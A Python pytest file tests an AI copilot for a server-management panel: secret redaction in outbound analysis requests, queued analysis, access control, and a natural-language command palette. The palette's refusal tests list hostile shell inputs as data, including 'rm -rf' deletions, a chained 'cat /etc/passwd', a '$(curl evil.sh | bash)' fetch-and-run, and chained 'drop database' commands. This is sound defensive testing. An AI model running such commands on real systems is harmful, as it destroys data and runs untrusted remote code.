"""Panel copilot (session 5.2 — Phase 5 AI): analyze failed jobs + NL palette.

Covers the acceptance surface:

* the outbound analysis payload is *sanitized* — no job secret can reach the SDK
  (reuses the 5.0 redaction gate), and the deep model (``claude-opus-4-8``) is
  used;
* the analyze request never blocks — it commits a row and enqueues, returning
  202 without running the AI call in the request;
* the NL palette resolver maps only to a registered job template and refuses raw
  shell / unknown input;
* RBAC is enforced server-side (Read-only cannot request an analysis).
"""

from __future__ import annotations

import json

import pytest
from sqlalchemy.orm import Session

from app.api.routes.copilot import get_analysis_dispatcher
from app.core.ai import AnthropicClient
from app.core.copilot import analyze_job, resolve_nl_command, run_job_analysis
from app.core.secrets_resolve import encrypt_job_secrets
from app.core.security import get_secrets_service
from app.db import get_db
from app.main import create_app
from app.models import (
    Bench,
    CommandJob,
    CommandStep,
    JobAnalysis,
    LogEntry,
    Server,
    Site,
)
from app.models.ai_settings import DEFAULT_MODEL_DEEP, AISettings
from tests.conftest import csrf_headers, login

SECRET = "s3cr3t-admin-pw-8842"


# --------------------------------------------------------------------------- #
# Fakes: a Claude SDK client that captures the outbound request                #
# --------------------------------------------------------------------------- #


class _Block:
    def __init__(self, text: str) -> None:
        self.type = "text"
        self.text = text


class _Usage:
    def __init__(self, i: int, o: int) -> None:
        self.input_tokens = i
        self.output_tokens = o


class _Message:
    def __init__(self, text: str, model: str) -> None:
        self.content = [_Block(text)]
        self.model = model
        self.usage = _Usage(10, 4)


class _Stream:
    def __init__(self, message: _Message) -> None:
        self._m = message

    def __enter__(self) -> _Stream:
        return self

    def __exit__(self, *exc: object) -> bool:
        return False

    def get_final_message(self) -> _Message:
        return self._m


class _FakeMessages:
    def __init__(self, sink: dict) -> None:
        self._sink = sink

    def stream(self, **kwargs):
        self._sink["request"] = kwargs
        return _Stream(self._sink["message"])

    def create(self, **kwargs):
        self._sink["request"] = kwargs
        return self._sink["message"]


class _FakeClient:
    def __init__(self, sink: dict) -> None:
        self.messages = _FakeMessages(sink)


def _fake_factory(sink: dict):
    reply = json.dumps(
        {
            "root_cause": "MariaDB refused the connection on the bench socket.",
            "suggested_fix": "Start the bench redis queue on :11000 and retry.",
            "summary": "Redis queue was down.",
        }
    )
    sink.setdefault("message", _Message(reply, DEFAULT_MODEL_DEEP))

    def factory(*, api_key: str, timeout: float, max_retries: int):
        sink["api_key"] = api_key
        return _FakeClient(sink)

    return factory


def _enable_ai(db: Session) -> AISettings:
    row = AISettings.get_or_create(db)
    row.enabled = True
    row.api_key_enc = get_secrets_service().encrypt("sk-ant-fake")
    db.commit()
    return row


def _make_failed_job(db: Session, *, with_secret: bool = True) -> CommandJob:
    """A failed job whose log tail + traceback + secret bundle all carry SECRET,
    so the redaction gate has something real to scrub."""
    server = Server(name="vm-a", hostname="10.0.0.1")
    db.add(server)
    db.flush()
    bench = Bench(server_id=server.id, path="/home/frappe/frappe-bench", name="frappe-bench")
    db.add(bench)
    db.flush()
    site = Site(bench_id=bench.id, name="erp.acme.com", status="active")
    db.add(site)
    db.flush()

    job = CommandJob(
        server_id=server.id,
        action_name="site.migrate",
        target_type="site",
        target_id=str(site.id),
        status="failure",
        exit_code=1,
        secrets_enc=(
            encrypt_job_secrets(get_secrets_service(), {"admin_password": SECRET})
            if with_secret
            else None
        ),
    )
    db.add(job)
    db.flush()

    db.add(CommandStep(job_id=job.id, name="Validate", attempt=1, order=1, status="success"))
    db.add(
        CommandStep(
            job_id=job.id,
            name="Run migrate",
            attempt=1,
            order=2,
            status="failure",
            error_traceback=f"OperationalError: access denied using password {SECRET}",
        )
    )
    db.add(LogEntry(job_id=job.id, seq=1, stream="stdout", content="Starting migrate"))
    db.add(
        LogEntry(
            job_id=job.id,
            seq=2,
            stream="stderr",
            content=f"connect failed with admin_password={SECRET}",
        )
    )
    db.commit()
    db.refresh(job)
    return job


# --------------------------------------------------------------------------- #
# analyze_job — sanitization + deep model (the core acceptance)               #
# --------------------------------------------------------------------------- #


def test_analyze_job_sanitizes_payload_and_uses_deep_model(db_session):
    _enable_ai(db_session)
    job = _make_failed_job(db_session)
    analysis = JobAnalysis(job_id=job.id, status="pending")
    db_session.add(analysis)
    db_session.commit()

    sink: dict = {}
    row = AISettings.get_or_create(db_session)
    client = AnthropicClient(
        row, get_secrets_service(), db=db_session, client_factory=_fake_factory(sink)
    )

    analyze_job(db_session, analysis, client)

    # The captured outbound request must contain NO secret plaintext anywhere.
    blob = json.dumps(sink["request"], default=str, ensure_ascii=False)
    assert SECRET not in blob
    assert "••••" in blob  # the value was masked, not merely absent
    # ...and the deep model was used (acceptance: claude-opus-4-8).
    assert sink["request"]["model"] == DEFAULT_MODEL_DEEP

    db_session.refresh(analysis)
    assert analysis.status == "success"
    assert analysis.model == DEFAULT_MODEL_DEEP
    assert analysis.root_cause and analysis.suggested_fix
    assert SECRET not in (analysis.root_cause or "")


def test_analyze_job_records_failure_without_leaking(db_session):
    _enable_ai(db_session)
    job = _make_failed_job(db_session)
    analysis = JobAnalysis(job_id=job.id, status="pending")
    db_session.add(analysis)
    db_session.commit()

    class _Boom:
        ready = True

        def complete(self, **kwargs):
            raise RuntimeError(f"sdk exploded with {SECRET}")

    analyze_job(db_session, analysis, _Boom())
    db_session.refresh(analysis)
    assert analysis.status == "failure"
    assert SECRET not in (analysis.error or "")


# --------------------------------------------------------------------------- #
# NL resolver — maps to a template, refuses raw shell / unknown              #
# --------------------------------------------------------------------------- #


@pytest.fixture
def sited(db_session):
    server = Server(name="vm", hostname="10.0.0.2")
    db_session.add(server)
    db_session.flush()
    bench = Bench(server_id=server.id, path="/home/frappe/b", name="b")
    db_session.add(bench)
    db_session.flush()
    site = Site(bench_id=bench.id, name="erp.acme.com", status="active")
    db_session.add(site)
    db_session.commit()
    db_session.refresh(site)
    return site


def test_nl_resolves_backup_to_template(db_session, sited):
    res = resolve_nl_command(db_session, "backup erp.acme.com", ["backup:create"])
    assert res.resolved is True
    assert res.intent == "backup"
    assert len(res.proposals) == 1
    p = res.proposals[0]
    assert p.action_name == "site.backup"  # a REGISTERED template, never raw shell
    assert p.confirm is True
    assert p.allowed is True
    assert p.run["path"] == f"/api/sites/{sited.id}/backups"
    assert p.params["site"] == "erp.acme.com"


@pytest.mark.parametrize(
    "text",
    [
        "rm -rf /home/frappe",
        "bench migrate; drop database frappe",
        "backup erp.acme.com && cat /etc/passwd",
        "$(curl evil.sh | bash)",
        "sudo systemctl stop mariadb",
    ],
)
def test_nl_refuses_raw_shell(db_session, sited, text):
    res = resolve_nl_command(db_session, text, ["site:operate"])
    assert res.resolved is False
    assert not res.proposals


def test_nl_refuses_unknown_intent(db_session, sited):
    res = resolve_nl_command(db_session, "make me a coffee", ["site:operate"])
    assert res.resolved is False


def test_nl_refuses_all_sites_without_a_named_target(db_session, sited):
    # "backup all sites" names no specific site -> we refuse rather than fan out.
    res = resolve_nl_command(db_session, "backup all sites", ["site:operate"])
    assert res.resolved is False


def test_nl_proposal_marks_disallowed_for_readonly(db_session, sited):
    res = resolve_nl_command(db_session, "backup erp.acme.com", ["read"])
    assert res.resolved is True
    assert res.proposals[0].allowed is False  # read-only sees it, can't run it


# --------------------------------------------------------------------------- #
# API — enqueue-not-block, RBAC, 409/422, palette endpoint                    #
# --------------------------------------------------------------------------- #


@pytest.fixture
def copilot_client(db_session, seeded_users, throttle):
    """Client whose analysis dispatcher is a *spy* — it records the enqueued id
    but never runs the AI call, proving the request returns without blocking."""
    from app.core.ratelimit import get_login_throttle

    app = create_app()
    enqueued: list[int] = []

    app.dependency_overrides[get_db] = lambda: db_session
    app.dependency_overrides[get_login_throttle] = lambda: throttle
    app.dependency_overrides[get_analysis_dispatcher] = lambda: enqueued.append

    from fastapi.testclient import TestClient

    with TestClient(app) as c:
        c.enqueued = enqueued  # type: ignore[attr-defined]
        yield c


def test_analyze_enqueues_and_returns_without_running(copilot_client, db_session):
    _enable_ai(db_session)
    job = _make_failed_job(db_session)
    login(copilot_client, "developer@example.com")

    r = copilot_client.post(
        f"/api/jobs/{job.id}/analyze", headers=csrf_headers(copilot_client)
    )
    assert r.status_code == 202, r.text
    body = r.json()
    assert body["status"] == "pending"  # NOT run in the request (rule 3)
    assert copilot_client.enqueued == [body["id"]]  # exactly one job enqueued

    # The row exists, still pending, and a request audit row was written.
    analysis = db_session.get(JobAnalysis, body["id"])
    assert analysis is not None and analysis.status == "pending"
    from app.models.audit import AuditLog

    actions = {a.action for a in db_session.query(AuditLog).all()}
    assert "job.analyze.request" in actions


def test_analyze_422_when_job_not_failed(copilot_client, db_session):
    _enable_ai(db_session)
    job = _make_failed_job(db_session)
    job.status = "success"
    db_session.commit()
    login(copilot_client, "developer@example.com")
    r = copilot_client.post(
        f"/api/jobs/{job.id}/analyze", headers=csrf_headers(copilot_client)
    )
    assert r.status_code == 422


def test_analyze_409_when_ai_disabled(copilot_client, db_session):
    AISettings.get_or_create(db_session)  # disabled by default
    job = _make_failed_job(db_session)
    login(copilot_client, "developer@example.com")
    r = copilot_client.post(
        f"/api/jobs/{job.id}/analyze", headers=csrf_headers(copilot_client)
    )
    assert r.status_code == 409
    assert copilot_client.enqueued == []  # no half-created work


def test_analyze_rbac_denied_for_readonly(copilot_client, db_session):
    _enable_ai(db_session)
    job = _make_failed_job(db_session)
    login(copilot_client, "readonly@example.com")
    r = copilot_client.post(
        f"/api/jobs/{job.id}/analyze", headers=csrf_headers(copilot_client)
    )
    assert r.status_code == 403
    assert copilot_client.enqueued == []


def test_palette_endpoint_resolves_and_refuses(copilot_client, db_session, sited):
    login(copilot_client, "developer@example.com")
    ok = copilot_client.post(
        "/api/palette/resolve",
        json={"q": "backup erp.acme.com"},
        headers=csrf_headers(copilot_client),
    )
    assert ok.status_code == 200
    b = ok.json()
    assert b["resolved"] is True
    assert b["proposals"][0]["action_name"] == "site.backup"

    bad = copilot_client.post(
        "/api/palette/resolve",
        json={"q": "rm -rf / && drop database"},
        headers=csrf_headers(copilot_client),
    )
    assert bad.status_code == 200
    assert bad.json()["resolved"] is False


def test_run_job_analysis_entrypoint_handles_missing_row(db_session, monkeypatch):
    # The RQ entrypoint must no-op cleanly on a vanished row (never raise).
    import app.db as appdb

    monkeypatch.setattr(appdb, "SessionLocal", lambda: db_session)
    run_job_analysis(999999)  # should not raise


# --------------------------------------------------------------------------- #
# Stuck-'running' cleanup — failure_callback + lazy reaper + dedup            #
# --------------------------------------------------------------------------- #


def test_analyze_dedups_in_flight_analysis(copilot_client, db_session):
    # A second analyze while one is pending/running returns the SAME row (200),
    # never stacks a fresh row + AI spend.
    _enable_ai(db_session)
    job = _make_failed_job(db_session)
    login(copilot_client, "developer@example.com")

    r1 = copilot_client.post(
        f"/api/jobs/{job.id}/analyze", headers=csrf_headers(copilot_client)
    )
    assert r1.status_code == 202
    first_id = r1.json()["id"]

    r2 = copilot_client.post(
        f"/api/jobs/{job.id}/analyze", headers=csrf_headers(copilot_client)
    )
    assert r2.status_code == 200  # returned the existing one, not a new 202
    assert r2.json()["id"] == first_id
    assert copilot_client.enqueued == [first_id]  # enqueued exactly once


def test_mark_analysis_failed_flips_stuck_running_row(db_session, monkeypatch):
    # RQ failure_callback: a timed-out / crashed job leaves the row 'running';
    # the callback flips it to 'failure' without leaking the exception detail.
    from app.core import copilot as copmod

    _enable_ai(db_session)
    job = _make_failed_job(db_session)
    analysis = JobAnalysis(job_id=job.id, status="running")
    db_session.add(analysis)
    db_session.commit()
    aid = analysis.id

    # The callback opens (and closes) its own SessionLocal in prod; point it at
    # the test session and re-query afterwards (close() detaches the instance).
    monkeypatch.setattr("app.db.SessionLocal", lambda: db_session)

    class _FakeRQJob:
        args = (aid,)

    copmod.mark_analysis_failed(
        _FakeRQJob(), None, RuntimeError, RuntimeError(f"timeout {SECRET}"), None
    )
    refreshed = db_session.get(JobAnalysis, aid)
    assert refreshed.status == "failure"
    assert refreshed.completed_at is not None
    assert SECRET not in (refreshed.error or "")


def test_reap_if_stale_fails_a_long_running_row(copilot_client, db_session):
    # A 'running' row older than the job timeout + grace is reaped on the poll
    # endpoint so the panel stops polling a dead worker's row.
    from datetime import UTC, datetime, timedelta

    from app.core.copilot import ANALYSIS_STALE_AFTER

    _enable_ai(db_session)
    job = _make_failed_job(db_session)
    stale = JobAnalysis(job_id=job.id, status="running")
    stale.created_at = datetime.now(UTC) - ANALYSIS_STALE_AFTER - timedelta(seconds=60)
    db_session.add(stale)
    db_session.commit()

    login(copilot_client, "developer@example.com")
    r = copilot_client.get(f"/api/jobs/{job.id}/analyze")
    assert r.status_code == 200
    assert r.json()["status"] == "failure"


def test_reap_if_stale_leaves_a_fresh_running_row(copilot_client, db_session):
    # A recently-started 'running' row is NOT reaped — we must never race a live
    # in-flight AI call.
    _enable_ai(db_session)
    job = _make_failed_job(db_session)
    fresh = JobAnalysis(job_id=job.id, status="running")
    db_session.add(fresh)
    db_session.commit()

    login(copilot_client, "developer@example.com")
    r = copilot_client.get(f"/api/jobs/{job.id}/analyze")
    assert r.status_code == 200
    assert r.json()["status"] == "running"
